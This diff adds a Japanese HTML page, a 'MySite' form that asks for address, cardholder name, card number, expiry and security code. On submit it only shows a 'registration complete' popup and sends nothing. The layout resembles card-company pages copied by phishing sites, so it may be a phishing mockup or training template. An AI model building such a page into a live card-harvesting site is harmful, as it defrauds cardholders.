@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>クレジットカード情報</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+            background-color: #f8f8f8;
+        }
+        
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background-color: #ffffff;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            overflow: hidden;
+        }
+        
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background-color: red;
+            color: #ffffff;
+            padding: 10px 15px;
+        }
+
+        #title {
+            color: white;
+            font-size: 15px;
+        }
+
+        .faq-button {
+            background: #ffffff;
+            color: #005bac;
+            border: none;
+            padding: 5px 10px;
+            border-radius: 5px;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        
+        .main-content {
+            padding: 20px;
+        }
+        
+        h1 {
+            font-size: 18px;
+            color: #333333;
+        }
+        
+        p {
+            margin-bottom: 20px;
+            color: #555555;
+        }
+        
+        .form {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+        
+        .form-group {
+            display: flex;
+            flex-direction: column;
+        }
+        
+        label {
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        
+        input, select, textarea {
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+
+        .expiry-date {
+            display: flex;
+            align-items: center;
+        }
+        
+        .expiry-date select {
+            width: 80px;
+            margin: 0 5px;
+        }
+        
+        .submit-button {
+            background-color: #005bac;
+            color: #ffffff;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        
+        .footer {
+            background-color: #f1f1f1;
+            padding: 15px;
+            text-align: center;
+        }
+
+        .required {
+            color: red;
+        }
+
+        /* ポップアップスタイル */
+        .popup {
+            display: none; /* 初期状態で非表示 */
+            position: fixed;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000; /* 他の要素より上に表示 */
+        }
+        
+        .popup-content {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            text-align: center;
+        }
+        
+        .close-popup {
+            margin-top: 10px;
+            background-color: #005bac;
+            color: white;
+            border: none;
+            padding: 5px 10px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header class="header">
+            <p id="title">MySite</p>
+            <button class="faq-button">よくあるご質問はこちら</button>
+        </header>
+        <main class="main-content">
+            <h1>クレジットカード情報</h1>
+            <p>下欄にご入力のうえ、[次へ進む]をクリック（タップ）してください。</p>
+            <form id="creditCardForm" class="form">
+                <div class="form-group">
+                    <label for="address">住所 <span class="required">必須</span></label>
+                    <textarea id="address" name="address" placeholder="例：〒123-4567 東京都千代田区1-1-1" rows="4" required></textarea>
+                </div>
+                <div class="form-group">
+                    <label for="card-owner">カード所有者 <span class="required">必須</span></label>
+                    <input type="text" id="card-owner" name="card-owner" placeholder="カードに記載されているお名前をご入力ください。" required>
+                </div>
+                <div class="form-group">
+                    <label for="card-number">会員番号（カード番号） <span class="required">必須</span></label>
+                    <input type="text" id="card-number" name="card-number" maxlength="16" placeholder="0000 0000 0000 0000" required>
+                    <small>※半角数字16桁</small>
+                </div>
+                <div class="form-group">
+                    <label for="expiry">カード有効期限 <span class="required">必須</span></label>
+                    <div class="expiry-date">
+                        <select id="expiry-month" name="expiry-month" required>
+                            <option value="" disabled selected>月</option>
+                            <option value="01">01</option>
+                            <option value="02">02</option>
+                            <!-- 他の月を追加 -->
+                        </select>
+                        <span> / </span>
+                        <select id="expiry-year" name="expiry-year" required>
+                            <option value="" disabled selected>年</option>
+                            <option value="2024">2024</option>
+                            <option value="2025">2025</option>
+                            <!-- 他の年を追加 -->
+                        </select>
+                    </div>
+                    <small>記入例：カードの表示「01/24」の場合は「01月2024年」とご入力ください。</small>
+                </div>
+                <div class="form-group">
+                    <label for="security-code">セキュリティコード <span class="required">必須</span></label>
+                    <input type="text" id="security-code" name="security-code" placeholder="カード裏面の3桁" required>
+                    <small>カード裏面に印字の3桁の番号をご入力ください。</small>
+                </div>
+                <button type="submit" class="submit-button">次へ進む</button>
+            </form>
+        </main>
+    </div>
+
+    <!-- ポップアップのHTML -->
+    <div class="popup" id="successPopup">
+        <div class="popup-content">
+            <h2>登録が完了しました</h2>
+            <button class="close-popup" onclick="closePopup()">閉じる</button>
+        </div>
+    </div>
+
+    <script>
+        // フォーム送信イベント
+        document.getElementById('creditCardForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // デフォルトのフォーム送信を防止
+            document.getElementById('successPopup').style.display = 'flex'; // ポップアップを表示
+        });
+
+        // ポップアップを閉じる関数
+        function closePopup() {
+            document.getElementById('successPopup').style.display = 'none'; // ポップアップを非表示
+        }
+    </script>
+</body>
+</html>
+
+
+
+
